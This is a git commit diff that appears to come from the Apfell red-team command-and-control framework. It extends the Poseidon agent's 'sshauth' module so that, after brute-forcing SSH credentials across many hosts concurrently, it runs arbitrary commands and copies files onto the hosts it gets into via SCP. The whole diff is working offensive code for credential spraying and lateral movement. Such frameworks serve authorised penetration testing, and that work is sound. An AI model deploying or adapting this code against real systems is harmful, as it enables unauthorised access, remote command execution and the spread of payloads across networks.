61aabc05289fc313276c31145197df3ac08a673b
Cody Thomas <codybthomas@gmail.com>
2019-10-10 18:55:40 -0700

    updated sshauth to include command execution and scp

--- apfell-docker/app/payloads/poseidon/commands/sshauth/sshauth.go
+++ apfell-docker/app/payloads/poseidon/commands/sshauth/sshauth.go
@@ -8,11 +8,11 @@ import (
 	"log"
 	"sync"
 	"time"
-
 	"portscan"
 	"pkg/utils/structs"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/sync/semaphore"
+	"github.com/tmc/scp"
 )
 
 var (
@@ -38,6 +38,9 @@ type SSHTestParams struct {
 	Username   string   `json:"username"`
 	Password   string   `json:"password"`
 	PrivateKey string   `json:"private_key"`
+	Command    string   `json:"command"`
+	Source     string   `json:"source"`
+	Destination string  `json:"destination"`
 }
 
 type SSHResult struct {
@@ -45,7 +48,9 @@ type SSHResult struct {
 	Success  bool   `json:"success"`
 	Username string `json:"username"`
 	Secret   string `json:"secret"`
+	Output   string `json:"output"`
 	Host     string `json:"host"`
+	CopyStatus string `json:"copy_status"`
 }
 
 // SSH Functions
@@ -62,7 +67,7 @@ func PublicKeyFile(file string) ssh.AuthMethod {
 	return ssh.PublicKeys(key)
 }
 
-func SSHLogin(host string, port int, cred Credential, debug bool) {
+func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string) {
 	var sshConfig *ssh.ClientConfig
 	if cred.PrivateKey == "" {
 		sshConfig = &ssh.ClientConfig{
@@ -103,47 +108,77 @@ func SSHLogin(host string, port int, cred Credential, debug bool) {
 		return
 	}
 	session, err := connection.NewSession()
+	defer session.Close()
 	if err != nil {
 		res.Success = false
 		res.Status = err.Error()
 		sshResultChan <- res
 		return
 	}
-	session.Close()
+	if source != "" && destination != ""{
+        err = scp.CopyPath(source, destination, session)
+        if err != nil{
+            res.CopyStatus = "Failed to copy: " + err.Error()
+        }else{
+            res.CopyStatus = "Successfully copied"
+        }
+	}
+	if command != ""{
+        modes := ssh.TerminalModes{
+            ssh.ECHO:   0, //disable echoing
+            ssh.TTY_OP_ISPEED: 14400,
+            ssh.TTY_OP_OSPEED: 14400,
+        }
+        err = session.RequestPty("xterm", 80, 40, modes)
+        if err != nil{
+            res.Success = false
+            res.Status = err.Error()
+            res.Output = "Failed to request PTY"
+            sshResultChan <- res
+            return
+        }
+        output, err := session.Output(command)
+        if err != nil{
 
+        }
+        res.Output = string(output)
+	}else{
+	    res.Output = ""
+	}
+	//session.Close()
 	res.Success = true
 	sshResultChan <- res
 }
 
-func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool) {
+func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool, command string, source string, destination string) {
 	wg := sync.WaitGroup{}
 
 	for i := 0; i < len(creds); i++ {
 		auth.lock.Acquire(context.TODO(), 1)
 		wg.Add(1)
-		go func(port int, cred Credential, debug bool) {
+		go func(port int, cred Credential, debug bool, command string, source string, destination string) {
 			defer auth.lock.Release(1)
 			defer wg.Done()
-			SSHLogin(auth.host, port, cred, debug)
-		}(port, creds[i], debug)
+			SSHLogin(auth.host, port, cred, debug, command, source, destination)
+		}(port, creds[i], debug, command, source, destination)
 	}
 	wg.Wait()
 }
 
-func SSHBruteHost(host string, port int, creds []Credential, debug bool) {
+func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
 	var lim int64 = 100
 	auth := &SSHAuthenticator{
 		host: host,
 		lock: semaphore.NewWeighted(lim),
 	}
-	auth.Brute(port, creds, debug)
+	auth.Brute(port, creds, debug, command, source, destination)
 }
 
-func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool) []SSHResult {
+func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string) []SSHResult {
 	for i := 0; i < len(hosts); i++ {
-		go func(host string, port int, creds []Credential, debug bool) {
-			SSHBruteHost(host, port, creds, debug)
-		}(hosts[i], port, creds, debug)
+		go func(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
+			SSHBruteHost(host, port, creds, debug, command, source, destination)
+		}(hosts[i], port, creds, debug, command, source, destination)
 	}
 	var successfulHosts []SSHResult
 	for i := 0; i < len(hosts); i++ {
@@ -215,7 +250,7 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		PrivateKey: params.PrivateKey,
 	}
 	// log.Println("Beginning brute force...")
-	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false)
+	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination)
 	// log.Println("Finished!")
 	if len(results) > 0 {
 		data, err := json.MarshalIndent(results, "", "    ")
